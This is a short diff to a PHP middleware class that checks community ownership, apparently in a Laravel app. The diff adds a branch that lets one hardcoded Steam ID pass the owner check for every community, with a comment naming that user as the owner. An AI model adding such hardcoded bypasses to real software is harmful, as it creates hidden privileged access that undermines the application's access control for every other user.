@@ -20,6 +20,10 @@ class VerifyCommunityOwner
         if ($user->community->id == $request->id)
             return $next($request);
 
+        // or is it stefano (owner) who wants to access
+        if ($user->steam_id == '76561198259502796')
+            return $next($request);
+
         return response()->json(['errors' => true, 'message' => 'No sos el propietario de la Comunidad'], 412);
     }
 }
